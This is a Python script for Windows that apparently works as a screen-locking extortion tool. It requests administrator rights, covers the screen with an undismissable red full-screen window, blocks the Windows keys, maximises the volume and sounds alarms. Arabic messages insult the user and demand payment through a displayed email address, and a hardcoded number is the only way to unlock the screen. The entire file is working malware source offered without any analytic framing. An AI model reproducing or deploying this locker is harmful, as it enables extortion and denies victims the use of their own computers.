import os
import sys
import shutil
import threading
import winsound
import ctypes
import tkinter as tk
from tkinter import messagebox
import keyboard


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{__file__}"', None, 1)
    sys.exit()


root = tk.Tk()
root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}")
root.overrideredirect(True)
root.attributes("-topmost", True)
root.resizable(False, False)
root.config(background="red")

winsound.MessageBeep(winsound.MB_ICONHAND)

def exit_app():
    keyboard.unhook_all()  
    root.destroy()
    os._exit(0)

for _ in range(50):
    keyboard.send('volume up')
def play_beep():

    winsound.MessageBeep(winsound.MB_ICONHAND)
    for _ in range(3):
        winsound.Beep(2800, 150)
        winsound.Beep(1200, 150)


def close():
    key = "2010723"
    if entry.get() == key:
        exit_app()
    else:
        threading.Thread(target=play_beep, daemon=True).start()
        messagebox.showerror("بطل بعبصه", "ادفع الاول التواصل على الخاص")


tk.Label(root, text=" اتنيل اكتب الرقم", bg="red", fg="white").pack(pady=20)

entry = tk.Entry(root, width=50, bd=0)
entry.pack(pady=20)

b = tk.Button(root, text="تأكيد", command=close)
b.pack(pady=18)

email_label = tk.Label(root, text="modybesher40@gmail.com", bg="red", fg="white")
x_pos = (root.winfo_screenwidth() // 2) - 50
email_label.place(x=x_pos, y=600)


keyboard.block_key('left windows')
keyboard.block_key('right windows')
root.protocol("WM_DELETE_WINDOW", lambda: None)


root.mainloop()